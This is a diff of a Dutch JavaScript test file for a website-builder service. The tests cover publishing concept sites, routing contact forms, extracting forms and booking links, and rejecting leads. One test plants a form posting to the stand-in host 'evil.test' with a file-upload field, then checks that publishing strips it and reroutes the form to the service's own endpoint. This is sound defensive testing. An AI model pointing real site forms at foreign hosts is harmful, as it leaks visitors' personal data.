@@ -678,7 +678,7 @@ console.log("Concept-websites voor leads");
     const naamFoto = cl.afbeeldingen.find((i) => !i.logo).naam;
     assert.equal((await call("GET", `taak/opdrachten/${o.id}/afbeeldingen/${naamFoto}`, { headers: tk, raw: true })).status, 200);
     const inhoud = { thema: "zacht", kleuren: { primair: "#c8102e" }, bedrijf: { naam: "Bakkerij Zon", telefoon: "030 123 45 67" }, hero: { titel: "Elke dag vers", tekst: "Brood en taart.", foto: `afbeeldingen/${naamFoto}` }, diensten: { items: [{ titel: "Vers brood", tekst: "Elke ochtend." }] } };
-    const ontwerp = `<!doctype html><html><head><title>Bakkerij Zon</title><style>h1{color:#c8102e}</style></head><body><header>Bakkerij Zon</header><main><h1>Elke dag vers</h1><p>${"Ambachtelijk brood uit Utrecht. ".repeat(160)}</p><img src="afbeeldingen/${naamFoto}" data-reveal><a class="sm-hoofdactie" href="tel:0301234567">Bel 030 123 45 67</a></main></body></html>`;
+    const ontwerp = `<!doctype html><html><head><title>Bakkerij Zon</title><style>h1{color:#c8102e}</style></head><body><header>Bakkerij Zon</header><main><h1>Elke dag vers</h1><p>${"Ambachtelijk brood uit Utrecht. ".repeat(160)}</p><img src="afbeeldingen/${naamFoto}" data-reveal><a class="sm-hoofdactie" href="tel:0301234567">Bel 030 123 45 67</a><form data-sm-formulier="Taart bestellen" action="https://evil.test/x"><label>Naam <input name="naam" required></label><label>E-mail <input type="email" name="email"></label><input type="file" name="foto"><select name="soort"><option>Appeltaart</option></select><textarea name="bericht"></textarea><button type="submit">Bestellen</button></form></main></body></html>`;
     const op = await call("PUT", `taak/opdrachten/${o.id}`, { headers: tk, body: { content: inhoud, html: ontwerp } });
     assert.equal(op.status, 200, JSON.stringify(op.data));
     let lijst = (await call("GET", "hq/opdrachten", { cookie: admin })).data.opdrachten;
@@ -692,6 +692,18 @@ console.log("Concept-websites voor leads");
     const rp = __ghFake.repos[site.data.repo];
     const live = rp.commits[rp.refs.main].files;
     assert.ok(live["ontwerp.html"] && live["beweging.js"] && live["sprite.svg"] && live[`afbeeldingen/${naamFoto}`], Object.keys(live).join(","));
+    // het formulier werkt op de echte site: post naar ons, wij mailen het naar de klant
+    const liveHtml = String(live["ontwerp.html"]);
+    const actie = (liveHtml.match(/action="([^"]+\/api\/formulier\/[^"]+)"/) || [])[1];
+    assert.ok(actie && !liveHtml.includes("evil.test") && !liveHtml.includes('type="file"') && liveHtml.includes('name="website_url"'), liveHtml.slice(liveHtml.indexOf("<form"), liveHtml.indexOf("<form") + 600));
+    const fd = new URLSearchParams({ _formulier: "Taart bestellen", naam: "Joop", email: "joop@klant.test", soort: "Appeltaart", bericht: "Graag zaterdag", website_url: "" });
+    const fr = await api(new Request(actie.replace(/^https?:\/\/[^/]+/, "https://sitemaker.test"), { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded", referer: "https://bakkerijzon.test/" }, body: fd }), { ip: "10.0.0.9" });
+    assert.equal(fr.status, 200); assert.match(await fr.text(), /Bedankt/);
+    const [fb] = await dbq("SELECT * FROM formulier_berichten WHERE customer_id = $1", [klant.id]);
+    assert.ok(fb && fb.email === "joop@klant.test" && fb.formulier === "Taart bestellen", JSON.stringify(fb));
+    assert.ok(captured.some((m) => /Nieuw bericht via je website: Taart bestellen/.test(m.subject) && m.replyTo === "joop@klant.test"), "mail aan de klant");
+    const nep = await api(new Request(actie.replace(/^https?:\/\/[^/]+/, "https://sitemaker.test").replace(/\/[^/]+$/, "/verkeerd"), { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body: fd }), { ip: "10.0.0.9" });
+    assert.match(await nep.text(), /niet \(meer\) geldig/);
     const [na] = await dbq("SELECT site_status FROM customers WHERE id = $1", [klant.id]);
     assert.equal(na.site_status, "live");
     assert.ok(captured.some((m) => /website staat online/i.test(m.subject)));
@@ -699,6 +711,31 @@ console.log("Concept-websites voor leads");
     const { pasHtmlAan } = await import("../netlify/lib/sites.mjs");
     assert.equal(pasHtmlAan("<p>a</p><p>b</p>", [{ zoek: "<p>b</p>", vervang: "<p>c</p>" }]).html, "<p>a</p><p>c</p>");
     assert.ok(pasHtmlAan("<p>a</p><p>a</p>", [{ zoek: "<p>a</p>", vervang: "x" }]).fout);
+  });
+  await test("formulieren en boekingssystemen van hun site worden herkend", async () => {
+    const { formulierenUit, boekingUit } = await import("../netlify/lib/concepts.mjs");
+    const html = `<form role="search"><input type="search" name="s"></form>
+      <form class="offerte"><label for="n">Naam *</label><input id="n" name="naam" required><label for="e">E-mail</label><input id="e" type="email" name="email">
+      <select name="dienst"><option>Kies een dienst</option><option>Schilderwerk binnen</option><option>Buiten</option></select>
+      <input type="radio" name="wanneer" value="Zo snel mogelijk"><input type="radio" name="wanneer" value="Binnen een maand"><input type="hidden" name="nonce"><button>Offerte aanvragen</button></form>
+      <a href="https://salonized.com/booking/abc">Boek online</a>`;
+    const f = formulierenUit([{ url: "https://x.test/offerte", html }]);
+    assert.equal(f.length, 1); assert.equal(f[0].knop, "Offerte aanvragen");
+    assert.deepEqual(f[0].velden.map((v) => v.label), ["Naam", "E-mail", "dienst", "wanneer"]);
+    assert.ok(f[0].velden[0].verplicht && f[0].velden[2].opties.length === 2 && f[0].velden[3].opties.length === 2, JSON.stringify(f));
+    assert.equal(boekingUit([{ url: "https://x.test", html }])[0].url, "https://salonized.com/booking/abc");
+  });
+  await test("concept afwijzen: geen mail, pagina dicht, uit de lijst", async () => {
+    const r = await call("POST", "hq/leads", { cookie: admin, body: { company: "Afwijs BV", email: "info@afwijs.test", website: "https://afwijs.test/" } });
+    const id = r.data.lead.id;
+    const { q: dq } = await import("../netlify/lib/core.mjs");
+    await dq("INSERT INTO concepts (lead_id, token, status, content) VALUES ($1, 'afwijstoken12345', 'klaar', '{}'::jsonb) ON CONFLICT DO NOTHING", [id]);
+    const a = await call("POST", `hq/leads/${id}/afwijzen`, { cookie: admin, body: {} });
+    assert.equal(a.status, 200, JSON.stringify(a.data));
+    const [l] = await dq("SELECT status FROM leads WHERE id = $1", [id]); assert.equal(l.status, "overgeslagen");
+    const lijst = (await call("GET", "hq/concepten?filter=beoordelen", { cookie: admin })).data.concepts;
+    assert.ok(!lijst.some((c) => c.leadId === id), "niet meer te beoordelen");
+    assert.match(String((await call("GET", "voorbeeld/afwijstoken12345")).data), /verlopen|niet \(meer\)/);
   });
   await test("webshops slaat de agent over; afmelden haalt het concept weg", async () => {
     const r = await call("POST", "hq/leads", { cookie: admin, body: { company: "Webwinkel", email: "info@webwinkel.test", website: "https://webwinkel.test/" } });
